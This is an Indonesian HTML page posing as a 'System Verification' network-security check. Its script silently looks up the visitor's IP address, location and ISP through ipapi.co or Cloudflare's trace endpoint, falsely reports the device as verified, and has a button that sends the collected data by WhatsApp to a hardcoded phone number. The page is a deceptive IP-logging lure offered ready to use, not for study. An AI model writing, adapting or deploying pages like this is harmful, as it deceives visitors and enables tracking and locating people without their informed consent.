<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body {
            background-color: #0d1117;
            color: #e6edf3;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 15px;
            padding: 25px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
        }

        h2 { color: #2ea043; margin-top: 0; }
        p { color: #8b949e; font-size: 0.9rem; }

        .status-box {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 15px;
            text-align: left;
            margin: 20px 0;
            font-family: monospace;
            font-size: 0.85rem;
        }

        .status-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            border-bottom: 1px solid #21262d;
            padding-bottom: 5px;
        }
        .status-item:last-child { border-bottom: none; margin-bottom: 0; }

        .label { color: #8b949e; }
        .value { color: #58a6ff; font-weight: bold; word-break: break-all; }

        button {
            background-color: #238636;
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        button:disabled {
            background-color: #30363d;
            cursor: not-allowed;
            color: #8b949e;
        }

        button:hover:not(:disabled) { background-color: #2ea043; }
    </style>
</head>
<body>

<div class="container">
    <h2>System Verification</h2>
    <p>Sistem sedang memvalidasi keamanan jaringan perangkat Anda.</p>

    <div class="status-box">
        <div class="status-item">
            <span class="label">IP Address:</span>
            <span class="value" id="disp-ip">Memindai...</span>
        </div>
        <div class="status-item">
            <span class="label">Lokasi:</span>
            <span class="value" id="disp-loc">...</span>
        </div>
        <div class="status-item">
            <span class="label">Status:</span>
            <span class="value" id="disp-status" style="color: #e3b341;">Checking...</span>
        </div>
    </div>

    <button id="btn-kirim" onclick="kirimWA()" disabled>
        KIRIM LAPORAN SEKARANG
    </button>
</div>

<script>
    // --- SETTING NOMOR ANDA DISINI ---
    const NOMOR_ADMIN = "6282234691398"; 
    // ---------------------------------

    let userData = {
        ip: "",
        loc: "Unknown",
        isp: "Unknown",
        code: "USR-" + Math.floor(Math.random() * 90000 + 10000)
    };

    async function scanNetwork() {
        try {
            // Metode Dual-Layer (Coba IPAPI dulu, kalau gagal ke Cloudflare)
            try {
                // Layer 1: IPAPI (Detail Lengkap)
                const res = await fetch('https://ipapi.co/json/');
                if(!res.ok) throw new Error("Blokir");
                const data = await res.json();
                
                userData.ip = data.ip;
                userData.loc = data.city + ", " + data.region;
                userData.isp = data.org;
                
            } catch (e) {
                // Layer 2: Cloudflare Trace (Anti-Blokir Opera/Adblock)
                console.log("Switching to Cloudflare...");
                const cf = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const text = await cf.text();
                
                // Ambil IP dari teks Cloudflare
                let ipMatch = text.match(/ip=(.+)/);
                let locMatch = text.match(/loc=(.+)/);
                
                userData.ip = ipMatch ? ipMatch[1] : "Tersembunyi";
                userData.loc = locMatch ? "Negara: " + locMatch[1] : "Unknown";
                userData.isp = "Private Network";
            }

            // Update Tampilan HTML
            document.getElementById('disp-ip').innerText = userData.ip;
            document.getElementById('disp-loc').innerText = userData.loc;
            document.getElementById('disp-status').innerText = "Terverifikasi";
            document.getElementById('disp-status').style.color = "#2ea043";

            // Aktifkan Tombol
            const btn = document.getElementById('btn-kirim');
            btn.disabled = false;
            btn.innerText = "KIRIM LAPORAN SEKARANG";

        } catch (err) {
            document.getElementById('disp-status').innerText = "Gagal (Cek Koneksi)";
            document.getElementById('disp-status').style.color = "red";
        }
    }

    function kirimWA() {
        if (!userData.ip) return;

        const pesan = `*LAPORAN SISTEM BARU*%0A` +
                      `---------------------------%0A` +
                      `*Code:* ${userData.code}%0A` +
                      `*IP:* ${userData.ip}%0A` +
                      `*Lokasi:* ${userData.loc}%0A` +
                      `*ISP:* ${userData.isp}%0A` +
                      `*Waktu:* ${new Date().toLocaleString('id-ID')}%0A` +
                      `---------------------------`;
        
        window.open(`https://wa.me/${NOMOR_ADMIN}?text=${pesan}`, '_blank');
    }

    // Jalankan otomatis
    scanNetwork();
</script>

</body>
</html>
